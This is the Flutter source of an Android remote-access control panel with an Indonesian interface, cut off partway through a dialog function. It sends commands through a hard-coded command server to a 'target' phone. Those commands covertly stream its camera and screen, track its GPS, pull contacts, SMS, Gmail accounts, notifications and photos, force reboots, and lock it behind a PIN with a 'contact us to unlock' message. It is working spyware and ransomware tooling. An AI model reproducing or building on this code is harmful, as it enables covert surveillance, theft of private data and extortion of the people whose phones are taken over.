import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Tab Dashboard
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  // ── Constants ──────────────────────────────────────────────────────────────
  static const _kBase  = 'http://xterclose.zorryxhostz.my.id:2000';
  static const _kBg    = Color(0xFF1A0015);
  static const _kCard  = Color(0xFF2A0000);
  static const _kBord  = Color(0xFF3D0000);
  static const _kText  = Color(0xFFFFF0F5);
  static const _kSub   = Color(0xFFA48888);
  static const _kRed   = Color(0xFFE53935);
  static const _kGreen = Color(0xFF43A047);
  static const _kBlue  = Color(0xFFE53935);
  static const _kOrng  = Color(0xFFFB8C00);
  static const _kPurp  = Color(0xFFC2185B);
  static const _kCyan  = Color(0xFFE53935);

  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _kRed}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c,
      content: Text(m, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: _kGreen);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Koneksi gagal'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('Foto kosong'); return; }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF1A0015),
      appBar: AppBar(
        backgroundColor: _kCard,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, color: _kText, size: 18),
          onPressed: () { if (_liveOn) _stopLive(); Navigator.pop(context); }),
        title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(_model, style: const TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.bold)),
          Row(children: [
            Icon(Icons.circle, color: _liveOn ? _kRed : _kSub, size: 7),
            const SizedBox(width: 5),
            Text('Battery: $_battery%  •  $_id',
                style: const TextStyle(color: _kSub, fontSize: 9), overflow: TextOverflow.ellipsis),
          ]),
        ]),
        actions: [
          if (_liveOn) Container(
            margin: const EdgeInsets.symmetric(vertical: 13, horizontal: 4),
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 3),
            decoration: BoxDecoration(color: _kRed.withOpacity(0.15), borderRadius: BorderRadius.circular(6), border: Border.all(color: _kRed.withOpacity(0.5))),
            child: Row(mainAxisSize: MainAxisSize.min, children: [
              Container(width: 6, height: 6, decoration: const BoxDecoration(color: _kRed, shape: BoxShape.circle)),
              const SizedBox(width: 5),
              Text('$_fps fps', style: const TextStyle(color: _kRed, fontSize: 11, fontWeight: FontWeight.bold)),
            ])),
          if (_sending) const Padding(padding: EdgeInsets.only(right: 10),
            child: Center(child: SizedBox(width: 14, height: 14,
                child: CircularProgressIndicator(strokeWidth: 2, color: _kRed)))),
          IconButton(icon: const Icon(Icons.refresh_rounded, color: _kSub, size: 18),
            onPressed: () { setState(() {}); _cmd('force_open', silent: true); }),
        ],
        bottom: TabBar(
          controller: _tabs,
          isScrollable: true,
          indicatorColor: const Color(0xFFE53935),
          indicatorWeight: 2,
          labelColor: _kText,
          unselectedLabelColor: _kSub,
          labelStyle: const TextStyle(fontSize: 11, fontWeight: FontWeight.w600, letterSpacing: 0.3),
          unselectedLabelStyle: const TextStyle(fontSize: 11),
          tabs: const [
            Tab(text: 'Live Stream'),
            Tab(text: 'Camera'),
            Tab(text: 'Intelligence'),
            Tab(text: 'Audio'),
            Tab(text: 'Lock & Chat'),
            Tab(text: 'Device'),
          ],
        ),
      ),
      body: Column(children: [
        // Activity log
        Container(
          height: 52, margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
          padding: const EdgeInsets.fromLTRB(12, 6, 12, 6),
          decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(8), border: Border.all(color: _kBord)),
          child: _log.isEmpty
              ? const Center(child: Text('No activity yet', style: TextStyle(color: _kSub, fontSize: 10)))
              : ListView.builder(itemCount: _log.length, itemBuilder: (_, i) =>
                  Text(_log[i], style: const TextStyle(color: _kSub, fontSize: 9, fontFamily: 'monospace'), maxLines: 1, overflow: TextOverflow.ellipsis)),
        ),
        Expanded(child: TabBarView(controller: _tabs, children: [
          _pageLive(),
          _pageCamera(),
          _pageIntel(),
          _pageAudio(),
          _pageLock(),
          _pageDevice(),
        ])),
      ]),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLive() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('Live Stream', 'Real-time kamera dan layar HP target'),
    const SizedBox(height: 14),
    // Preview
    Container(
      height: _liveOn ? 220 : 90,
      decoration: BoxDecoration(
        color: Color(0xFF120000),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: _liveOn ? _kRed.withOpacity(0.5) : _kBord)),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(9),
        child: _liveOn && _frame != null
            ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
            : Center(child: Text(_liveOn ? 'Waiting for frames...' : 'Stream inactive',
                style: const TextStyle(color: _kSub, fontSize: 11))),
      ),
    ),
    const SizedBox(height: 14),
    Row(children: [
      Expanded(child: _actionBtn('Live Camera', _kRed, Icons.videocam_rounded, () {
        _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); });
      })),
      const SizedBox(width: 10),
      Expanded(child: _actionBtn('Live Screen', _kCyan, Icons.desktop_windows_rounded, () {
        _startLive('live_screen_start', ''); _showLiveDialog();
      })),
    ]),
    if (_liveOn) ...[
      const SizedBox(height: 10),
      _actionBtn('Stop Live', _kSub, Icons.stop_rounded, _stopLive),
    ],
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: CAMERA
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageCamera() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('Camera & Visual', 'Foto, screenshot, wallpaper, strobe'),
    const SizedBox(height: 14),
    _actionBtn('Take Photo',   _kOrng,  Icons.camera_alt_rounded,      () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
    _gap,
    _actionBtn('Screenshot',   _kBlue,  Icons.screenshot_monitor,       () => _cmd('get_screen')),
    _gap,
    _actionBtn('Set Wallpaper', _kPurp, Icons.wallpaper_rounded,        () => _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))),
    _gap,
    Row(children: [
      Expanded(child: _actionBtn('Strobe ON',  _kOrng,              Icons.flash_on_rounded,  () => _cmd('flash_strobe'))),
      const SizedBox(width: 10),
      Expanded(child: _actionBtn('Strobe OFF', _kSub, Icons.flash_off_rounded, () => _cmd('stop_strobe'))),
    ]),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: INTELLIGENCE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageIntel() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('Intelligence', 'Data dan informasi dari HP target'),
    const SizedBox(height: 14),
    _actionBtn('Contacts',          _kRed,   Icons.contacts_rounded,         () => _cmd('get_contacts')),
    _gap,
    _actionBtn('GPS Location',      _kGreen, Icons.my_location_rounded,       () => _cmd('get_location')),
    _gap,
    _actionBtn('Gmail & Accounts',  _kRed,   Icons.account_circle_rounded,    () => _cmd('get_gmails')),
    _gap,
    _actionBtn('SMS Inbox',         _kCyan,  Icons.sms_rounded,               () => _cmd('get_sms')),
    _gap,
    _actionBtn('Notifications',     _kPurp,  Icons.notifications_rounded,     () => _fetchNotif()),
    _gap,
    _actionBtn('Gallery (5 Photos)',_kPurp,  Icons.photo_library_rounded,     () => _cmd('get_gallery', extra: '5')),
    _gap,
    _actionBtn('Request Notif Access', _kSub, Icons.security_rounded,         () => _cmd('open_notification_settings')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: AUDIO
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageAudio() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('Audio & Network', 'Kontrol audio dan jaringan HP target'),
    const SizedBox(height: 14),
    _actionBtn('Play Audio',   _kOrng, Icons.play_circle_rounded,  () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
    _gap,
    _actionBtn('Stop Audio',   _kSub,  Icons.stop_circle_rounded,  () => _cmd('stop_audio')),
    _gap,
    _actionBtn('Vibrate Loop', _kPurp, Icons.vibration_rounded,    () => _cmd('vibrate_loop')),
    _gap,
    _actionBtn('Open URL',     _kBlue, Icons.open_in_browser,      () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))),
    _gap,
    _actionBtn('Kill WiFi',    _kCyan, Icons.wifi_off_rounded,     () => _cmd('kill_wifi')),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LOCK & CHAT
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLock() => Column(children: [
    Expanded(child: ListView(padding: const EdgeInsets.all(16), children: [
      _header('Remote Lock', 'Kunci HP target dan chat langsung'),
      const SizedBox(height: 14),

      // Lock section
      _actionBtn('Lock Live + Chat', _kRed, Icons.lock_rounded, () {
        _lockLiveDialog();
      }),
      _gap,
      _actionBtn('Lock Device', _kOrng, Icons.lock_outline_rounded, () {
        _lockChatDialog();
      }),
      _gap,
      _actionBtn('Lock Device', _kOrng, Icons.lock_outline_rounded, () {
        _inputDialog('Lock Device', 'Pesan di layar lock', (msg) {
          _inputDialog('PIN Unlock', '4 digit PIN', (pin) {
            _cmd('hard_lock', extra: '$msg|$pin');
          }, isNumber: true, hint: '1234');
        });
      }),
      _gap,
      _actionBtn('Unlock Device', _kGreen, Icons.lock_open_rounded, () => _cmd('unlock')),
      const SizedBox(height: 20),

      // Chat section
      _header('Chat dengan Target', 'Pesan diterima target di layar lock'),
      const SizedBox(height: 10),
      Container(
        height: 200,
        decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBord)),
        child: _chat.isEmpty
            ? const Center(child: Text('Belum ada pesan', style: TextStyle(color: _kSub, fontSize: 11)))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.all(10),
                itemCount: _chat.length,
                itemBuilder: (_, i) {
                  final m = _chat[i];
                  final isOwner = m['from'] == 'owner';
                  return Align(
                    alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                    child: Container(
                      margin: const EdgeInsets.symmetric(vertical: 3),
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
                      decoration: BoxDecoration(
                        color: isOwner ? _kRed.withOpacity(0.85) : const Color(0xFF3D0000),
                        borderRadius: BorderRadius.circular(10)),
                      child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                        Text(m['text'] ?? '', style: const TextStyle(color: _kText, fontSize: 12)),
                        const SizedBox(height: 2),
                        Text(m['time'] ?? '', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                      ]),
                    ),
                  );
                }),
      ),
    ])),
    // Chat input bar
    Container(
      padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
      decoration: const BoxDecoration(color: _kCard, border: Border(top: BorderSide(color: _kBord))),
      child: Row(children: [
        Expanded(child: TextField(
          controller: _chatCtrl,
          style: const TextStyle(color: _kText, fontSize: 13),
          decoration: InputDecoration(
            hintText: 'Ketik pesan ke target...',
            hintStyle: const TextStyle(color: _kSub, fontSize: 12),
            filled: true, fillColor: const Color(0xFF1E0000),
            contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(20), borderSide: BorderSide.none),
          ),
          onSubmitted: _sendChat,
        )),
        const SizedBox(width: 8),
        GestureDetector(
          onTap: () => _sendChat(_chatCtrl.text),
          child: Container(
            padding: const EdgeInsets.all(11),
            decoration: const BoxDecoration(color: _kRed, shape: BoxShape.circle),
            child: const Icon(Icons.send_rounded, color: Colors.white, size: 16)),
        ),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: DEVICE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(16), children: [
    _header('Device Control', 'Kontrol sistem HP target'),
    const SizedBox(height: 14),
    _actionBtn('Restart Device', _kOrng, Icons.restart_alt_rounded, () {
      showDialog(context: context, builder: (_) => AlertDialog(
        backgroundColor: _kCard,
        title: const Text('Restart Device', style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.bold)),
        content: const Text(
          'HP target akan di-restart.\n\nMenggunakan PowerManager reflection — tidak memerlukan root atau device admin.',
          style: TextStyle(color: _kSub, fontSize: 13, height: 1.5)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Batal', style: TextStyle(color: _kSub))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: _kOrng, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
            onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
            child: const Text('Restart', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
        ],
      ));
    }),
    _gap,
    _actionBtn('Wake Up Target', _kGreen, Icons.wb_sunny_rounded, () => _cmd('force_open')),
    const SizedBox(height: 20),
    Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(10), border: Border.all(color: _kBord)),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        const Text('Restart Methods', style: TextStyle(color: _kText, fontSize: 12, fontWeight: FontWeight.w600)),
        const SizedBox(height: 8),
        _infoRow('1', 'PowerManager reflection (no root required)'),
        _infoRow('2', 'DevicePolicyManager (if admin active)'),
        _infoRow('3', 'su -c reboot (root)'),
        _infoRow('4', 'am crash system_server'),
        _infoRow('5', 'pkill -9 zygote'),
      ]),
    ),
  ]);

  // ─────────────────────────────────────────────────────────────────────────
  // DIALOGS
  // ─────────────────────────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: const Color(0xFF1A0015),
          insetPadding: const EdgeInsets.all(6),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              decoration: BoxDecoration(color: _kCard, borderRadius: const BorderRadius.vertical(top: Radius.circular(12)), border: const Border(bottom: BorderSide(color: _kBord))),
              child: Row(children: [
                Container(width: 8, height: 8, decoration: const BoxDecoration(color: _kRed, shape: BoxShape.circle)),
                const SizedBox(width: 8),
                Text('LIVE — $_liveTitle', style: const TextStyle(color: _kText, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 0.5)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(color: _kGreen.withOpacity(0.15), borderRadius: BorderRadius.circular(6), border: Border.all(color: _kGreen.withOpacity(0.4))),
                  child: Text('$_fps fps', style: const TextStyle(color: _kGreen, fontSize: 10, fontWeight: FontWeight.bold))),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.52),
              color: Color(0xFF120000),
              child: _frame != null
                  ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
                  : const SizedBox(height: 180, child: Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                      CircularProgressIndicator(color: _kRed, strokeWidth: 2),
                      SizedBox(height: 10),
                      Text('Waiting for frames...', style: TextStyle(color: _kSub, fontSize: 11)),
                    ]))),
            ),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: const BoxDecoration(color: _kCard, borderRadius: BorderRadius.vertical(bottom: Radius.circular(12))),
              child: Row(children: [
                Expanded(child: OutlinedButton.icon(
                  style: OutlinedButton.styleFrom(side: BorderSide(color: _kBord), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
                  icon: const Icon(Icons.cameraswitch_rounded, color: _kSub, size: 15),
                  label: const Text('Switch Camera', style: TextStyle(color: _kSub, fontSize: 11)),
                  onPressed: () {
                    final isFront = _liveTitle.contains('DEPAN');
                    _stopLive();
                    Future.delayed(const Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                  },
                )),
                const SizedBox(width: 8),
                Expanded(child: ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(backgroundColor: _kRed, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
                  icon: const Icon(Icons.stop_rounded, color: Colors.white, size: 15),
                  label: const Text('Stop', style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
                  onPressed: () { _stopLive(); Navigator.pop(ctx); },
                )),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
      title: const Text('Lock Live + Chat', style: TextStyle(color: Colors.pinkAccent, fontSize: 15, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        const Text('Target dikunci + bisa chat 2 arah', style: TextStyle(color: _kSub, fontSize: 12)),
        const SizedBox(height: 12),
        _field(msgCtrl, 'Pesan di layar lock', hint: 'HP ini dikunci administrator'),
        const SizedBox(height: 10),
        _field(pinCtrl, 'PIN Unlock', hint: '1234', isNum: true),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Batal', style: TextStyle(color: _kSub))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: Colors.pinkAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () {
            Navigator.pop(context);
            final msg = msgCtrl.text.trim().isEmpty ? 'HP INI DIKUNCI ADMINISTRATOR' : msgCtrl.text.trim();
            final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
            _cmd('lock_live', extra: '$msg|$pin');
          },
          child: const Text('LOCK LIVE', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
      ],
    ));
  }

  void _lockChatDialog() {
    final msgCtrl  = TextEditingController();
    final pinCtrl  = TextEditingController();
    final chatCtrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
      title: const Text('Lock Device + Chat', style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.bold)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(msgCtrl, 'Pesan di layar lock', hint: 'Contoh: HP ini dikunci administrator'),
        const SizedBox(height: 10),
        _field(pinCtrl, 'PIN Unlock', hint: '1234', isNum: true),
        const SizedBox(height: 10),
        _field(chatCtrl, 'Pesan chat ke target (opsional)', hint: 'Hubungi kami untuk membuka kunci'),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('Batal', style: TextStyle(color: _kSub))),
        ElevatedButton(
          style: ElevatedButton.styleFrom(backgroundColor: _kRed, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
          onPressed: () {
            Navigator.pop(context);
            final msg = msgCtrl.text.trim().isEmpty ? 'HP INI DIKUNCI ADMINISTRATOR' : msgCtrl.text.trim();
            final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
            _cmd('hard_lock', extra: '$msg|$pin');
            if (chatCtrl.text.trim().isNotEmpty) {
              Future.delayed(const Duration(milliseconds: 500), () => _sendChat(chatCtrl.text.trim()));
            }
          },
          child: const Text('Lock', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => AlertDialog(
        backgroundColor: _kCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: const Text('Select Camera', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
          final isSel = sel == v;
          return GestureDetector(
            onTap: () => ss(() => sel = v),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 22, vertical: 14),
              decoration: BoxDecoration(
                color: isSel ? _kRed.withOpacity(0.1) : Colors.transparent,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: isSel ? _kRed : _kBord)),
              child: Column(children: [
                Icon(v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded, color: isSel ? _kRed : _kSub, size: 28),
                const SizedBox(height: 6),
                Text(v == 'back' ? 'Back' : 'Front', style: TextStyle(color: isSel ? _kRed : _kSub, fontSize: 11, fontWeight: FontWeight.w600)),
              ]),
            ),
          );
        }).toList()),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Cancel', style: TextStyle(color: _kSub))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: _kRed, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
            onPressed: () { Navigator.pop(ctx); onPick(sel); },
            child: const Text('Select', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold))),
        ],
      ),
    ));
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: _kCard,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      title: Text(title, style: const TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.bold)),
